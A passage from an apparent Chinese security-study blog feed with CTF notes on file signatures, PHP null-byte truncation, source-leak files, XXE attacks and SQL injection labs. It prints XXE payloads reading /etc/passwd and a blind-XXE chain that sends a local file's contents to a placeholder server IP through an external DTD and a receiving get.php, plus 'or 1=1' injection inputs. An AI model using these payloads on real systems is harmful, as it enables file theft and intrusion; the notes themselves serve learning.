    <content type="html"><![CDATA[<p>在winhex下会经常看到许多十六进制码,这里深刻了解下.<br><a id="more"></a></p><ul><li>jpg/jpeg  文件头:FF D8 FF</li><li>png       文件头:89 50 4E 47 0D</li><li>gif       文件头:47 49 46 38 39</li><li>zip       文件头:50 4B 03 04 14</li><li>rar       文件头:52 61 72 21 1A</li><li>bmp       文件头:42 4D 36 5D 3D</li><li>mp3       文件头:49 44 33 03 00</li><li>wav       文件头:52 49 46 46 18</li></ul><p><a href="https://www.cnblogs.com/WangAoBo/p/6366211.html" target="_blank" rel="noopener">https://www.cnblogs.com/WangAoBo/p/6366211.html</a><br><br><br><a href="https://www.cnblogs.com/sch01ar/p/8232084.html" target="_blank" rel="noopener">https://www.cnblogs.com/sch01ar/p/8232084.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在winhex下会经常看到许多十六进制码,这里深刻了解下.&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>PHP %00截断原理</title>
    <link href="http://yoursite.com/2018/07/06/%E6%88%AA%E6%96%AD%E9%97%AE%E9%A2%98/"/>
    <id>http://yoursite.com/2018/07/06/截断问题/</id>
    <published>2018-07-06T05:24:35.632Z</published>
    <updated>2018-07-06T10:36:47.788Z</updated>
    
    <content type="html"><![CDATA[<p>这里有篇不错的文章<br><br><a id="more"></a><br><a href="https://blog.csdn.net/zhangzhuangtongxue/article/details/78198191" target="_blank" rel="noopener">从源码级别了解PHP %00截断原理</a></p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>PHP的00截断是5.2.x版本的一个漏洞，当用户输入的url参数包含%00经过浏览器自动转码后截断后面字符。</p><h2 id="漏洞代码示例"><a href="#漏洞代码示例" class="headerlink" title="漏洞代码示例"></a>漏洞代码示例</h2><p>例如url输入的文件名1.txt%00.jpg经过url转码后会变为1.txt\000.jpg，测试文件1.php如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">    include &quot;1.txt\000.jpg&quot;;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>测试文件1.txt如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">    echo &apos;fireXXX&apos;;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>php5.2.x版本解析1.php时，会将1.txt\000.jpg解释为1.txt </p><h2 id="长度问题"><a href="#长度问题" class="headerlink" title="长度问题"></a>长度问题</h2><p>旦出现%00截断，include的文件名经过url转码由”1.txt%00.jpg”变为”1.txt\000.jpg”，进入php语法词法分析器解析后会将这个字符串解析成一个字符串，并使用zend_scan_escape_string进行字符串转码<br><br>中间的\\000还被解析为4个字符，转码中会将他当作八进制数据转成一个字符\0，因此最终1.txt\000.jpg长度是10。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这里有篇不错的文章&lt;br&gt;&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>文件源码泄漏大全</title>
    <link href="http://yoursite.com/2018/07/06/yuanma/"/>
    <id>http://yoursite.com/2018/07/06/yuanma/</id>
    <published>2018-07-06T05:24:35.617Z</published>
    <updated>2018-07-06T10:44:24.257Z</updated>
    
    <content type="html"><![CDATA[<h4 id="2018年从一个朋友学到了很多，决定总结一下内容，以下内容纯属借鉴，请勿抄袭。"><a href="#2018年从一个朋友学到了很多，决定总结一下内容，以下内容纯属借鉴，请勿抄袭。" class="headerlink" title="2018年从一个朋友学到了很多，决定总结一下内容，以下内容纯属借鉴，请勿抄袭。"></a>2018年从一个朋友学到了很多，决定总结一下内容，以下内容纯属借鉴，请勿抄袭。</h4><h3 id="git源码泄漏"><a href="#git源码泄漏" class="headerlink" title=".git源码泄漏"></a>.git源码泄漏</h3><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。<br><a id="more"></a><br> <a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">原理链接+工具链接</a></p><h3 id="DS-Store文件泄漏"><a href="#DS-Store文件泄漏" class="headerlink" title=".DS_Store文件泄漏"></a>.DS_Store文件泄漏</h3><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>.DS_Store是Mac下Finder用来保存如何展示 文件/文件夹 的数据文件，每个文件夹下对应一个。<br>如果开发/设计人员将.DS_Store上传部署到线上环境，可能造成文件目录结构泄漏，特别是备份文件、源代码文件。</p><p><a href="https://github.com/lijiejie/ds_store_exp" target="_blank" rel="noopener">原理链接+工具链接</a></p><h3 id="swp源码泄漏"><a href="#swp源码泄漏" class="headerlink" title=".swp源码泄漏"></a>.swp源码泄漏</h3><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><h4 id="vim临时文件"><a href="#vim临时文件" class="headerlink" title="vim临时文件"></a>vim临时文件</h4><p>程序员使用vim编辑器编写index.php文件时，会有一个.index.php.swp文件，如果文件正常退出，则该文件被删除，如果异常退出，该文件则会保存下来，该文件可以用来恢复异常退出的index.php。</p><p>2017年的东华杯出现过类似的题目</p><h3 id="vim备份文件"><a href="#vim备份文件" class="headerlink" title="vim备份文件"></a>vim备份文件</h3><p>默认情况下使用Vim编程，在修改文件后系统会自动生成一个带~的备份文件，某些情况下可以对其下载进行查看；<br>例如：<br>index.php的备份文件则为index.php~</p><p>还有很多，以后慢慢补上</p><p><a href="http://www.s2.sshz.org/post/source-code-leak/" target="_blank" rel="noopener">参考链接</a></p><p><a href="https://yangzcc.github.io/2017/12/26/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2/" target="_blank" rel="noopener">朋友链接</a></p><h3 id="备份文件泄露"><a href="#备份文件泄露" class="headerlink" title="备份文件泄露"></a>备份文件泄露</h3><p>发现一个很不错的检测源码泄漏工具 php代码泄露检测<br><a href="https://coding.net/u/yihangwang/p/SourceLeakHacker/git?public=true" target="_blank" rel="noopener">php代码泄露检测工具</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;2018年从一个朋友学到了很多，决定总结一下内容，以下内容纯属借鉴，请勿抄袭。&quot;&gt;&lt;a href=&quot;#2018年从一个朋友学到了很多，决定总结一下内容，以下内容纯属借鉴，请勿抄袭。&quot; class=&quot;headerlink&quot; title=&quot;2018年从一个朋友学到了很多，决定总结一下内容，以下内容纯属借鉴，请勿抄袭。&quot;&gt;&lt;/a&gt;2018年从一个朋友学到了很多，决定总结一下内容，以下内容纯属借鉴，请勿抄袭。&lt;/h4&gt;&lt;h3 id=&quot;git源码泄漏&quot;&gt;&lt;a href=&quot;#git源码泄漏&quot; class=&quot;headerlink&quot; title=&quot;.git源码泄漏&quot;&gt;&lt;/a&gt;.git源码泄漏&lt;/h3&gt;&lt;h3 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h3&gt;&lt;p&gt;在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>在JSON中玩转XXE攻击</title>
    <link href="http://yoursite.com/2018/07/06/xxe%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2018/07/06/xxe漏洞/</id>
    <published>2018-07-06T05:24:35.617Z</published>
    <updated>2018-07-06T10:44:14.081Z</updated>
    
    <content type="html"><![CDATA[<p>参考链接:<a href="http://bobao.360.cn/learning/detail/360.html" target="_blank" rel="noopener">在JSON中玩转XXE攻击 </a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在刷题的过程中遇到了一个没见过的新姿势，这里记录一下加深对xxe漏洞的认识</p><h2 id="xml基础"><a href="#xml基础" class="headerlink" title="xml基础"></a>xml基础</h2><p>要了解xxe漏洞前先了解xml文档的基础，这是基本知识<br><a id="more"></a><br>和html的区别为:<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">XML 被设计为传输和存储数据，其焦点是数据的内容。</span><br><span class="line">HTML 被设计用来显示数据，其焦点是数据的外观。</span><br></pre></td></tr></table></figure></p><p>这样就好理解多了，xml还有一些关键知识如dtd实体要了解，有点长，自行百度理解<br><a href="https://www.cnblogs.com/r00tuser/p/7255939.html" target="_blank" rel="noopener">https://www.cnblogs.com/r00tuser/p/7255939.html</a></p><h2 id="Content-Type-在JSON中进行XXE攻击"><a href="#Content-Type-在JSON中进行XXE攻击" class="headerlink" title="Content-Type 在JSON中进行XXE攻击"></a>Content-Type 在JSON中进行XXE攻击</h2><p>XXE是一种针对XML终端实施的攻击，黑客想要实施这种攻击，需要在XML的payload包含外部实体声明，且服务器本身允许实体扩展。这样的话，黑客或许能读取WEB服务器的文件系统，通过UNC路径访问远程文件系统，或者通过HTTP/HTTPS连接到任意主机。在下面的例子中，我们将一个外部实体指向了WEB服务器上的/etc/passwd，该实体就是包含在XML的payload里的。</p><p>一个简洁有效的xxe攻击如下:<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE netspi [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;</span><br><span class="line">[some xml content..]</span><br><span class="line">&lt;element&gt;&amp;xxe;&lt;/element&gt;</span><br><span class="line">[some xml content..]</span><br></pre></td></tr></table></figure></p><p>接下来看利用Content-Type头和HTTP请求的payload，是否也能黑掉JSON的终端。下面是一个JSON请求样本，它将Content-Type设置为application/json，其中精简了大部分内容。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">HTTP Request:</span><br><span class="line">POST /netspi HTTP/1.1</span><br><span class="line">Host: someserver.netspi.com</span><br><span class="line">Accept: application/json</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 38</span><br><span class="line">&#123;&quot;search&quot;:&quot;name&quot;,&quot;value&quot;:&quot;netspitest&quot;&#125;</span><br><span class="line">HTTP Response:</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 43</span><br><span class="line">&#123;&quot;error&quot;: &quot;no results for name netspitest&quot;&#125;</span><br></pre></td></tr></table></figure><p>如果Content-Type头被修改为application/xml，客户端会告诉服务器post过去的数据是XML格式的。但如果你实际传过去的不是xml格式的话，服务器不会进行解析，并且会报如下的错：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">HTTP Request:</span><br><span class="line">POST /netspi HTTP/1.1</span><br><span class="line">Host: someserver.netspi.com</span><br><span class="line">Accept: application/json</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Content-Length: 38</span><br><span class="line">&#123;&quot;search&quot;:&quot;name&quot;,&quot;value&quot;:&quot;netspitest&quot;&#125;</span><br><span class="line">HTTP Request:</span><br><span class="line">HTTP/1.1 500 Internal Server Error</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 127</span><br><span class="line">&#123;&quot;errors&quot;:&#123;&quot;errorMessage&quot;:&quot;org.xml.sax.SAXParseException: XML document structures must start and end within the same entity.&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><p>说明服务器能够处理XML格式和JSON格式的数据，但现在服务器收到的真实数据格式并不是在Content-Type里声明的XML格式，所以这里自然不能被解析啦。为了解决这个问题，JSON格式被强行转换为XML格式。</p><p>Original JSON<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;search&quot;:&quot;name&quot;,&quot;value&quot;:&quot;netspitest&quot;&#125;</span><br></pre></td></tr></table></figure></p><p>XML Conversion<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;search&gt;name&lt;/search&gt;</span><br><span class="line">&lt;value&gt;netspitest&lt;/value&gt;</span><br></pre></td></tr></table></figure></p><p>然而，这样直接转换过来的XML文档很明显是无效的，它并没有XML格式文件所必须的\<root>元素。如果这个XML格式的文件被发送到服务器上，有可能服务器会为此响应一个错误消息，所有最好的做法是为该转换过的XML文档加一个\<root>元素。</root></root></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;search&gt;name&lt;/search&gt;</span><br><span class="line">&lt;value&gt;netspitest&lt;/value&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTTP Response:</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 43</span><br><span class="line">&#123;&quot;error&quot;: &quot;no results for name netspitest&quot;&#125;</span><br></pre></td></tr></table></figure><p>因为在这里服务器是可以接收XML的数据的，黑客能由此对JSON终端实施XXE攻击。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE netspi [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;search&gt;name&lt;/search&gt;</span><br><span class="line">&lt;value&gt;&amp;xxe;&lt;/value&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure><p>黑客在这里就可以读到/etc/passwd的文件内容</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>不是每一个JSON终端都会接收XML格式，改变Content-Type一般没有用处，有可能只能得到415的数据类型不支持错误。但是，JSON转换为XML的攻击不会只限制于通过post传输带有JSON内容的payload，如果JSON的参数被转换为XML，服务器会自己判断content type的真实类型。</p><p>学到了很多，以后有关于xxe漏洞的新姿势继续补上</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;参考链接:&lt;a href=&quot;http://bobao.360.cn/learning/detail/360.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;在JSON中玩转XXE攻击 &lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;在刷题的过程中遇到了一个没见过的新姿势，这里记录一下加深对xxe漏洞的认识&lt;/p&gt;
&lt;h2 id=&quot;xml基础&quot;&gt;&lt;a href=&quot;#xml基础&quot; class=&quot;headerlink&quot; title=&quot;xml基础&quot;&gt;&lt;/a&gt;xml基础&lt;/h2&gt;&lt;p&gt;要了解xxe漏洞前先了解xml文档的基础，这是基本知识&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>xxe漏洞的复现解析</title>
    <link href="http://yoursite.com/2018/07/06/xxe%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://yoursite.com/2018/07/06/xxe漏洞复现/</id>
    <published>2018-07-06T05:24:35.617Z</published>
    <updated>2018-07-06T10:44:20.273Z</updated>
    
    <content type="html"><![CDATA[<p>参考链接:<a href="https://www.jianshu.com/p/163879fc1018" target="_blank" rel="noopener">https://www.jianshu.com/p/163879fc1018</a></p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>当XML文件中出现关键字”SYSTEM”定义的“实体”（DOCTYPE头部标签中会呈现），便可通过XML文件中定义的’实体’ , 访问本地或者远程的内容。这时候，XML解析器在SYSTEM的作用下从URI中读取内容，并允许它在XML文档中被替换，从而造成外部实体攻击。此时，Web应用如果产生数据回显，则会将URL中的数据呈现在应用界面上。<br>而如果Web端注意到这一点，没有设置回显，那么攻击者可以将数据通过外数据通道发送到攻击者服务器，从而达到攻击效果。<br><a id="more"></a></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>这里用phpstudy以及自己的服务器进行搭建环境</p><p>首先本地根目录下写两个文件</p><p>test.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">$xml=&lt;&lt;&lt;EOF</span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line"> &lt;!ENTITY milin SYSTEM &quot;file:///D:/phpStudy/PHPTutorial/WWW/pwd.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;a&gt;&amp;milin;&lt;/a&gt;</span><br><span class="line">EOF;</span><br><span class="line">$data = simplexml_load_string($xml);</span><br><span class="line">print_r($data);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>pwd.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">21212121(任意都可以,假设这个文本是攻击者想要的内容)</span><br></pre></td></tr></table></figure><ul><li>&lt;&lt;&lt;EOF ….. EOF; 这中间不对敏感字符进行转义</li><li>simplexml_load_string()函数:转换形式良好的 XML 字符串为 SimpleXMLElement 对象，然后输出对象的键和元素</li></ul><p>然后访问本地文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/test.php</span><br></pre></td></tr></table></figure></p><p><img src="http://p1vrkwaxt.bkt.clouddn.com/%28X5A%25L5JMQQ5@HX4K%5D%7DBP0M.png" alt="image"></p><p>可以看到pwd.txt的文件成功地被读取了出来</p><h2 id="无回显的情况"><a href="#无回显的情况" class="headerlink" title="无回显的情况"></a>无回显的情况</h2><p>但是如果没有回显，即没有print_r($data),这样就没法读取到pwd.txt了，这里的办法是将回显数据通过外数据通道发送到另一个服务器</p><p>这里联系自己的服务器进行攻击</p><p>test.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">$xml=&lt;&lt;&lt;EOF</span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line"> &lt;!ENTITY % file SYSTEM &quot;file:///D:/phpStudy/PHPTutorial/WWW/pwd.txt&quot;&gt;</span><br><span class="line"> &lt;!ENTITY % xml SYSTEM &quot;http://服务器_IP/milin.xml&quot;&gt;</span><br><span class="line">%xml;</span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br><span class="line">EOF;</span><br><span class="line">$data = simplexml_load_string($xml);</span><br><span class="line">print_r($data);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>然后在自己的服务器放个milin.xml文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all</span><br><span class="line">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://服务器_IP/get.php?file=%file;&apos;&gt;&quot;</span><br><span class="line">&gt;</span><br><span class="line">%all;</span><br></pre></td></tr></table></figure></p><p>然后为了接受这个文件的数据，再构造一个get.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">file_put_contents(&quot;key.txt&quot;, $_GET[&apos;file&apos;]) ; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>最后访问URL模拟攻击:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/test.php</span><br></pre></td></tr></table></figure></p><p>会发现在自己的服务器目录生成了一个key.txt,里面内容为你本地的pwd.txt</p><h2 id="遇到的一些无法复现的问题"><a href="#遇到的一些无法复现的问题" class="headerlink" title="遇到的一些无法复现的问题"></a>遇到的一些无法复现的问题</h2><p><img src="http://p1vrkwaxt.bkt.clouddn.com/7F6003B4ACBF683F4BE602542DAD0CF6.png" alt="image"></p><p>我也遇到了这个函数的问题，但切换版本总是一样结果，后来把phpstudy删了重装结果好了= =</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;参考链接:&lt;a href=&quot;https://www.jianshu.com/p/163879fc1018&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.jianshu.com/p/163879fc1018&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;当XML文件中出现关键字”SYSTEM”定义的“实体”（DOCTYPE头部标签中会呈现），便可通过XML文件中定义的’实体’ , 访问本地或者远程的内容。这时候，XML解析器在SYSTEM的作用下从URI中读取内容，并允许它在XML文档中被替换，从而造成外部实体攻击。此时，Web应用如果产生数据回显，则会将URL中的数据呈现在应用界面上。&lt;br&gt;而如果Web端注意到这一点，没有设置回显，那么攻击者可以将数据通过外数据通道发送到攻击者服务器，从而达到攻击效果。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>chrome 代理设置ss(ssr)</title>
    <link href="http://yoursite.com/2018/07/06/%E5%85%B3%E4%BA%8ESSR%E9%85%8D%E7%BD%AE/"/>
    <id>http://yoursite.com/2018/07/06/关于SSR配置/</id>
    <published>2018-07-06T05:24:35.617Z</published>
    <updated>2018-07-06T10:36:53.625Z</updated>
    
    <content type="html"><![CDATA[<p>参考链接:<a href="https://www.jianshu.com/p/4c0553dbc970" target="_blank" rel="noopener">https://www.jianshu.com/p/4c0553dbc970</a><br><a id="more"></a></p><p>先看这个吧，害怕三连.jpg</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;参考链接:&lt;a href=&quot;https://www.jianshu.com/p/4c0553dbc970&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.jianshu.com/p/4c0553dbc970&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>网络安全实验室-注入关</title>
    <link href="http://yoursite.com/2018/07/06/wangluo3/"/>
    <id>http://yoursite.com/2018/07/06/wangluo3/</id>
    <published>2018-07-06T05:24:35.617Z</published>
    <updated>2018-07-06T10:43:59.752Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1-最简单的SQL注入"><a href="#1-最简单的SQL注入" class="headerlink" title="1.最简单的SQL注入"></a>1.最简单的SQL注入</h3><h3 id="Tips题目里有简单提示"><a href="#Tips题目里有简单提示" class="headerlink" title="Tips题目里有简单提示"></a>Tips题目里有简单提示</h3><a id="more"></a><p><img src="http://p1vrkwaxt.bkt.clouddn.com/1YHOVS8SDQR8GPHE$0%5DPNFV.png" alt="image"></p><p><img src="http://p1vrkwaxt.bkt.clouddn.com/A%28_A%28%25%5B850EMEWN0435IOL7.png" alt="image"></p><h3 id="2-最简单的SQL注入-熟悉注入环境-最简单的SQL注入"><a href="#2-最简单的SQL注入-熟悉注入环境-最简单的SQL注入" class="headerlink" title="2.最简单的SQL注入(熟悉注入环境)最简单的SQL注入"></a>2.最简单的SQL注入(熟悉注入环境)<br>最简单的SQL注入</h3><ul><li>查看源代码得到注入点id</li><li>构造url id=1,id=1’发现存在注入点</li><li>id=1 or 1 =1得到flag</li></ul><h3 id="3-防注入小明终于知道，原来黑客如此的吊，还有sql注入这种高端技术，因此他开始学习防注入"><a href="#3-防注入小明终于知道，原来黑客如此的吊，还有sql注入这种高端技术，因此他开始学习防注入" class="headerlink" title="3.防注入小明终于知道，原来黑客如此的吊，还有sql注入这种高端技术，因此他开始学习防注入!"></a>3.防注入<br>小明终于知道，原来黑客如此的吊，还有sql注入这种高端技术，因此他开始学习防注入!</h3><h4 id="原理-sql宽字节注入"><a href="#原理-sql宽字节注入" class="headerlink" title="原理:sql宽字节注入"></a>原理:sql宽字节注入</h4><p><img src="http://p1vrkwaxt.bkt.clouddn.com/YEUJ%28OGKT@X%60%7DAWA8L~G9%7BU.png" alt="image"><br><br>报错说明sql存在宽字节注入<br><br><img src="http://p1vrkwaxt.bkt.clouddn.com/JCJ3N%25L%60%5B%5DKNIH%28$%2801T0YW.png" alt="image"><br><br>查询第3行的数据得到flag</p><h3 id="4-到底能不能回显小明经过学习，终于对SQL注入有了理解，她知道原来sql注入的发生根本原因还是数据和语句不能正确分离的原因，导致数据作为sql语句执行；但是是不是只要能够控制sql语句的一部分就能够来利用获取数据呢？小明经过思考知道，where条件可控的情况下，实在是太容易了，但是如果是在limit条件呢？"><a href="#4-到底能不能回显小明经过学习，终于对SQL注入有了理解，她知道原来sql注入的发生根本原因还是数据和语句不能正确分离的原因，导致数据作为sql语句执行；但是是不是只要能够控制sql语句的一部分就能够来利用获取数据呢？小明经过思考知道，where条件可控的情况下，实在是太容易了，但是如果是在limit条件呢？" class="headerlink" title="4.到底能不能回显小明经过学习，终于对SQL注入有了理解，她知道原来sql注入的发生根本原因还是数据和语句不能正确分离的原因，导致数据作为sql语句执行；但是是不是只要能够控制sql语句的一部分就能够来利用获取数据呢？小明经过思考知道，where条件可控的情况下，实在是太容易了，但是如果是在limit条件呢？"></a>4.到底能不能回显<br>小明经过学习，终于对SQL注入有了理解，她知道原来sql注入的发生根本原因还是数据和语句不能正确分离的原因，导致数据作为sql语句执行；但是是不是只要能够控制sql语句的一部分就能够来利用获取数据呢？小明经过思考知道，where条件可控的情况下，实在是太容易了，但是如果是在limit条件呢？</h3>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;1-最简单的SQL注入&quot;&gt;&lt;a href=&quot;#1-最简单的SQL注入&quot; class=&quot;headerlink&quot; title=&quot;1.最简单的SQL注入&quot;&gt;&lt;/a&gt;1.最简单的SQL注入&lt;/h3&gt;&lt;h3 id=&quot;Tips题目里有简单提示&quot;&gt;&lt;a href=&quot;#Tips题目里有简单提示&quot; class=&quot;headerlink&quot; title=&quot;Tips题目里有简单提示&quot;&gt;&lt;/a&gt;Tips题目里有简单提示&lt;/h3&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>网络安全实验室-脚本关</title>
    <link href="http://yoursite.com/2018/07/06/wangluo2/"/>
    <id>http://yoursite.com/2018/07/06/wangluo2/</id>
    <published>2018-07-06T05:24:35.617Z</published>
    <updated>2018-07-06T10:43:53.577Z</updated>
    
